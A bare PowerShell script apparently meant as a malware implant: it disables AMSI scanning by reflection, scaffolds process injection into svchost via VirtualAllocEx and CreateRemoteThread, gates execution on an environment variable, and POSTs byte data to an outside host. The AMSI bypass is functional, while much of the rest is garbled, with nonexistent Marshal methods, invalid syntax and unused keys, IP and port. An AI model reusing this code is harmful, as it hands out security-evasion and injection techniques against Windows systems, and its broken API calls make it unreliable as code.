
$IP = "10.211.55.5"
$PORT = 9001


$key = New-Object Byte[] 32
$rng = New-Object System.Security.Cryptography.RNGCryptoServiceProvider
$rng.GetBytes($key)

$aes = New-Object System.Security.Cryptography.AesManaged
$aes.Key = $key
$aes.GenerateIV()
$iv = $aes.IV


$a = [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
$f = $a.GetField('amsiInitFailed','NonPublic,Static')
$f.SetValue($null,$true)


$targetProc = Get-Process -Name svchost
$handle = [System.Runtime.InteropServices.Marshal]::GetPointerToStringAuto($targetProc.Handle)
$remoteMem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal([System.IntPtr]::Size)


$shellcode = [System.BitConverter]::GetBytes(0xbf) 


$hProcess = [System.Runtime.InteropServices.Marshal]::GetHINSTANCE("kernel32.dll")
$VirtualAllocEx = [System.Runtime.InteropServices.Marshal]::GetProcAddress($hProcess, "VirtualAllocEx")
$WriteProcessMemory = [System.Runtime.InteropServices.Marshal]::GetProcAddress($hProcess, "WriteProcessMemory")
$CreateRemoteThread = [System.Runtime.InteropServices.Marshal]::GetProcAddress($hProcess, "CreateRemoteThread")

$lpAddress = [System.IntPtr]::Zero
$dwSize = $shellcode.Length
$flAllocationType = 0x40
$flProtect = 0x40

[System.Runtime.InteropServices.Marshal]::Invoke($VirtualAllocEx, $targetProc.Handle, $lpAddress, $dwSize, $flAllocationType, $flProtect)


$envKey = "YOUR_ENV_VAR"
If ($env:$envKey -eq $null) {
Exit
}


$httpRequest = [System.Net.WebRequest]::Create("https://example.com")
$httpRequest.Method = "POST"
$httpRequest.Headers.Add("User-Agent", "Mozilla/5.0")


$requestStream = $httpRequest.GetRequestStream()
$requestStream.Write($shellcode, 0, $shellcode.Length)
$requestStream.Close()


$response = $httpRequest.GetResponse()
$response.Close()


[System.Runtime.InteropServices.Marshal]::FreeHGlobal($remoteMem)
